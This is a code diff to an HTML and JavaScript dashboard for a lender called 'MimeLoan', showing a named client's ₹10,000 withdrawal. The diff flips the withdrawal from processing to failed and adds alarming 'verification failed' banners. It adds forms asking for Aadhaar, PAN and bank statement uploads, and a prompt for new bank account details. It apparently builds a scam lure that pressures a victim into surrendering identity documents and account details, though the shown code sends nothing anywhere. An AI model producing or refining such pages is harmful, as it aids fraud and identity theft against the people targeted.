@@ -190,6 +190,12 @@
             color: #991b1b;
         }
         
+        .notification.warning {
+            background-color: #fffbeb;
+            border-left: 4px solid var(--warning-color);
+            color: #92400e;
+        }
+        
         /* Dashboard Styles */
         .dashboard-container {
             display: none;
@@ -309,15 +315,15 @@
         }
         
         .highlight-box {
-            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+            background: linear-gradient(135deg, #fef2f2 0%, #fee2e2 100%);
             border-radius: var(--border-radius);
             padding: 22px;
-            border: 1px solid #bae6fd;
+            border: 1px solid #fecaca;
             margin-top: 24px;
         }
         
         .highlight-title {
-            color: var(--primary-color);
+            color: var(--danger-color);
             font-weight: 700;
             margin-bottom: 12px;
             display: flex;
@@ -349,6 +355,11 @@
         .status-pending {
             background-color: #fef3c7;
             color: #92400e;
+        }
+        
+        .status-failed {
+            background-color: #fee2e2;
+            color: #991b1b;
         }
         
         .loan-eligibility {
@@ -419,6 +430,17 @@
         
         .btn-secondary:hover {
             background-color: #e2e8f0;
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            color: white;
+            border: none;
+        }
+        
+        .btn-danger:hover {
+            background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
+            transform: translateY(-2px);
         }
         
         .footer {
@@ -610,6 +632,35 @@
         
         .payment-instruction p {
             margin-bottom: 8px;
+        }
+        
+        /* Account Verification Warning */
+        .verification-warning {
+            background: linear-gradient(135deg, #fee2e2 0%, #fecaca 100%);
+            border-radius: var(--border-radius);
+            padding: 25px;
+            margin-bottom: 30px;
+            border: 1px solid #fca5a5;
+            text-align: center;
+        }
+        
+        .warning-icon {
+            font-size: 48px;
+            color: #ef4444;
+            margin-bottom: 15px;
+        }
+        
+        .warning-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: #991b1b;
+            margin-bottom: 10px;
+        }
+        
+        .warning-message {
+            color: #7f1d1d;
+            margin-bottom: 20px;
+            line-height: 1.6;
         }
         
         /* Responsive Styles */
@@ -842,9 +893,29 @@
                     <div class="avatar">H</div>
                     <div>
                         <div style="font-weight: 700;">Harish Barnala</div>
-                        <div style="font-size: 13px; color: #64748b;">Premium Client</div>
+                        <div style="font-size: 13px; color: #64748b;">Account Verification Required</div>
                     </div>
                     <button class="logout-btn" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Logout</button>
+                </div>
+            </div>
+            
+            <!-- Account Verification Warning -->
+            <div class="verification-warning">
+                <div class="warning-icon">
+                    <i class="fas fa-exclamation-triangle"></i>
+                </div>
+                <div class="warning-title">ACCOUNT VERIFICATION FAILED</div>
+                <div class="warning-message">
+                    Your ₹10,000 withdrawal request has failed due to incomplete account verification.<br>
+                    Please use another bank account or complete KYC verification to proceed.
+                </div>
+                <div class="action-buttons" style="margin-top: 20px;">
+                    <button class="btn-action btn-danger" id="kycVerificationBtn">
+                        <i class="fas fa-user-check"></i> Complete KYC Verification
+                    </button>
+                    <button class="btn-action btn-primary" id="useOtherAccountBtn">
+                        <i class="fas fa-exchange-alt"></i> Use Another Bank Account
+                    </button>
                 </div>
             </div>
             
@@ -894,7 +965,7 @@
                                 </div>
                                 <div class="info-item">
                                     <div class="info-label">Withdrawal Request</div>
-                                    <div class="info-value">₹10,000 <span class="status-badge status-pending">Processing</span></div>
+                                    <div class="info-value">₹10,000 <span class="status-badge status-failed">Failed</span></div>
                                 </div>
                                 <div class="info-item">
                                     <div class="info-label">Payment to Account</div>
@@ -902,21 +973,21 @@
                                 </div>
                                 <div class="info-item">
                                     <div class="info-label">Account Status</div>
-                                    <div class="info-value">Active <span class="status-badge status-success">Verified</span></div>
+                                    <div class="info-value">Verification Required <span class="status-badge status-failed">Failed</span></div>
                                 </div>
                             </div>
                             
                             <div class="highlight-box">
                                 <div class="highlight-title">
-                                    <i class="fas fa-info-circle"></i> Transaction Summary
+                                    <i class="fas fa-exclamation-circle"></i> Transaction Failed
                                 </div>
-                                <p>Your ₹10,000 top-up has been successfully processed to your Kotak Bank account. The withdrawal request of ₹10,000 is currently being processed and will be transferred to your account ending with 1180 within 24 hours.</p>
+                                <p><strong>₹10,000 withdrawal has failed due to incomplete account verification.</strong> The Kotak Bank account ending with 1180 could not be verified. Please complete KYC verification or use another bank account to proceed with your withdrawal.</p>
                             </div>
                         </div>
                         
                         <div class="action-buttons">
-                            <button class="btn-action btn-primary" id="requestMoreBtn">
-                                <i class="fas fa-plus-circle"></i> Request Additional Funds
+                            <button class="btn-action btn-primary" id="resubmitWithdrawalBtn">
+                                <i class="fas fa-redo-alt"></i> Resubmit Withdrawal Request
                             </button>
                             <button class="btn-action btn-secondary" id="viewStatementBtn">
                                 <i class="fas fa-file-invoice"></i> Download Statement
@@ -941,19 +1012,19 @@
                             </div>
                             <div class="info-item">
                                 <div class="info-label">Today</div>
+                                <div class="info-value">Withdrawal failed - Account verification</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="info-label">Yesterday</div>
                                 <div class="info-value">Top-up of ₹10,000 processed</div>
                             </div>
                             <div class="info-item">
-                                <div class="info-label">Today</div>
+                                <div class="info-label">Yesterday</div>
                                 <div class="info-value">Withdrawal request submitted</div>
                             </div>
                             <div class="info-item">
-                                <div class="info-label">this week</div>
-                                <div class="info-value">EMI payment of ₹5000 made</div>
-                            </div>
-                            <div class="info-item">
-                                <div class="info-label">Last Month</div>
-                                <div class="info-value">Credit score updated: </div>
+                                <div class="info-label">Last Week</div>
+                                <div class="info-value">EMI payment of ₹2,500 made</div>
                             </div>
                         </div>
                     </div>
@@ -1096,7 +1167,7 @@
                     
                     <div class="loan-detail-row">
                         <div class="loan-detail-label">Withdrawal Request:</div>
-                        <div class="loan-detail-value">₹10,000 <span class="status-badge status-pending">Pending</span></div>
+                        <div class="loan-detail-value">₹10,000 <span class="status-badge status-failed">Failed</span></div>
                     </div>
                     
                     <div class="loan-detail-row">
@@ -1113,6 +1184,7 @@
                             <i class="fas fa-exclamation-circle"></i> Important Note
                         </div>
                         <p>After returning ₹10,000, you are now eligible for a loan of ₹1,50,000. This is based on your excellent repayment history and credit score with MimeLoan.</p>
+                        <p style="margin-top: 10px; color: #991b1b;"><strong>Note:</strong> Your ₹10,000 withdrawal failed due to account verification issues. Please complete KYC or use another account.</p>
                     </div>
                 </div>
                 
@@ -1193,6 +1265,69 @@
         </div>
     </div>
 
+    <!-- KYC Verification Modal -->
+    <div class="modal-overlay" id="kycModal">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="modal-title">
+                    <i class="fas fa-user-check"></i> Complete KYC Verification
+                </div>
+                <button class="modal-close" id="closeKycModal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="notification warning">
+                    <p><strong>Important:</strong> Your account verification is incomplete. Please complete KYC to proceed with withdrawals.</p>
+                </div>
+                
+                <div class="process-step step-current">
+                    <div>
+                        <span class="step-number">1</span>
+                        <span class="step-title">Upload Documents</span>
+                    </div>
+                    <div class="step-description">
+                        Upload clear photos of the following documents:
+                        <ul style="margin-left: 20px; margin-top: 8px;">
+                            <li>Aadhaar Card (Front & Back)</li>
+                            <li>PAN Card</li>
+                            <li>Bank Statement (Last 6 months)</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="aadhaarFront">Aadhaar Card (Front)</label>
+                    <input type="file" id="aadhaarFront" class="form-control" accept="image/*">
+                </div>
+                
+                <div class="form-group">
+                    <label for="aadhaarBack">Aadhaar Card (Back)</label>
+                    <input type="file" id="aadhaarBack" class="form-control" accept="image/*">
+                </div>
+                
+                <div class="form-group">
+                    <label for="panCard">PAN Card</label>
+                    <input type="file" id="panCard" class="form-control" accept="image/*">
+                </div>
+                
+                <div class="process-step">
+                    <div>
+                        <span class="step-number">2</span>
+                        <span class="step-title">Video Verification</span>
+                    </div>
+                    <div class="step-description">
+                        After document upload, our executive will schedule a video call for verification.
+                    </div>
+                </div>
+                
+                <div id="kycNotification" class="notification" style="margin-top: 20px; display: none;"></div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn-secondary" id="cancelKyc">Cancel</button>
+                <button class="btn-primary" id="submitKyc">Submit KYC Documents</button>
+            </div>
+        </div>
+    </div>
+
     <script>
         // DOM Elements
         const loginPage = document.getElementById('loginPage');
@@ -1204,6 +1339,9 @@
         const requestMoreBtn = document.getElementById('requestMoreBtn');
         const viewStatementBtn = document.getElementById('viewStatementBtn');
         const newLoanRequestBtn = document.getElementById('newLoanRequestBtn');
+        const kycVerificationBtn = document.getElementById('kycVerificationBtn');
+        const useOtherAccountBtn = document.getElementById('useOtherAccountBtn');
+        const resubmitWithdrawalBtn = document.getElementById('resubmitWithdrawalBtn');
         
         // Payment elements
         const cardPaymentForm = document.getElementById('cardPaymentForm');
@@ -1220,6 +1358,13 @@
         const processReturn = document.getElementById('processReturn');
         const modalNotification = document.getElementById('modalNotification');
         const returnMethod = document.getElementById('returnMethod');
+        
+        // KYC Modal elements
+        const kycModal = document.getElementById('kycModal');
+        const closeKycModal = document.getElementById('closeKycModal');
+        const cancelKyc = document.getElementById('cancelKyc');
+        const submitKyc = document.getElementById('submitKyc');
+        const kycNotification = document.getElementById('kycNotification');
         
         // Tabs
         const tabs = document.querySelectorAll('.tab');
@@ -1289,6 +1434,22 @@
         logoutBtn.addEventListener('click', function() {
             localStorage.removeItem('mimeLoanLoggedIn');
             showLogin();
+        });
+        
+        // KYC Verification button
+        kycVerificationBtn.addEventListener('click', function() {
+            kycModal.style.display = 'flex';
+            kycNotification.style.display = 'none';
+        });
+        
+        // Use Another Account button
+        useOtherAccountBtn.addEventListener('click', function() {
+            alert('Please enter your new bank account details:\n\n1. Account Holder Name\n2. Account Number\n3. IFSC Code\n4. Bank Name\n\nWe will update your account and verify it within 24 hours.');
+        });
+        
+        // Resubmit Withdrawal button
+        resubmitWithdrawalBtn.addEventListener('click', function() {
+            alert('Please complete KYC verification or update your bank account details before resubmitting withdrawal request.');
         });
         
         // Apply for loan button - NEW FLOW
@@ -1423,6 +1584,38 @@
             paymentNotification.scrollIntoView({ behavior: 'smooth' });
         });
         
+        // Submit KYC button
+        submitKyc.addEventListener('click', function() {
+            const aadhaarFront = document.getElementById('aadhaarFront').value;
+            const aadhaarBack = document.getElementById('aadhaarBack').value;
+            const panCard = document.getElementById('panCard').value;
+            
+            if (!aadhaarFront || !aadhaarBack || !panCard) {
+                kycNotification.textContent = 'Please upload all required documents.';
+                kycNotification.className = 'notification error';
+                kycNotification.style.display = 'block';
+                return;
+            }
+            
+            kycNotification.textContent = 'KYC documents submitted successfully! Verification will be completed within 24 hours.';
+            kycNotification.className = 'notification success';
+            kycNotification.style.display = 'block';
+            
+            setTimeout(() => {
+                alert('KYC submitted successfully! Our team will verify your documents and update your account status within 24 hours.');
+                kycModal.style.display = 'none';
+            }, 2000);
+        });
+        
+        // Close KYC modal
+        closeKycModal.addEventListener('click', function() {
+            kycModal.style.display = 'none';
+        });
+        
+        cancelKyc.addEventListener('click', function() {
+            kycModal.style.display = 'none';
+        });
+        
         // Main tab switching
         tabs.forEach(tab => {
             tab.addEventListener('click', function() {
@@ -1479,6 +1672,9 @@
         window.addEventListener('click', function(e) {
             if (e.target === loanModal) {
                 loanModal.style.display = 'none';
+            }
+            if (e.target === kycModal) {
+                kycModal.style.display = 'none';
             }
         });
     </script>
